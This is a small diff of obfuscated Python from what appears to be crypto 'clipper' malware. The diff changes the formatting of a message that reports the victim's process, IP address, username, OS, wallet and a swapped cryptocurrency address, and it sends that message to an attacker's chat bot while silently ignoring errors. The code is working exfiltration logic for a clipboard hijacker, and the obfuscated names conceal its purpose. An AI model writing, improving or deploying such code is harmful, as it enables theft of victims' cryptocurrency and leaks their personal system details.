@@ -139,7 +139,7 @@ def redugh8(btr43, we8098, fweui89, ewfxe32):
 async def egreger453645(wadwa32, fexccxvxcew, ewsfuin8934, fweijf):
     try:
         zh5 = ef9igj48(token=kuhio49)
-        eguo6643 = f'💰 [Clipper]\n\nProcess Name: **{wadwa32}**\n\nIP: **{efewrf}**\nUser: **{ewsjinf783.getlogin()}**\nOS: **{awdewa98ßu43} {awdewa98ßu43we}**\nWallet: **{fexccxvxcew}**\n\nAddress: **{ewsfuin8934}**\nReplaced: **{fweijf}**'
+        eguo6643 = f'💰 [Clipper]\n\nProcess Name: {wadwa32}\n\nIP: {efewrf}\nUser: {ewsjinf783.getlogin()}\nOS: {awdewa98ßu43} {awdewa98ßu43we}\nWallet: {fexccxvxcew}\n\nAddress: {ewsfuin8934}\nReplaced: {fweijf}'
         await zh5.send_message(chat_id=kuhioxx49, text=eguo6643)
     except Exception as e:
         pass
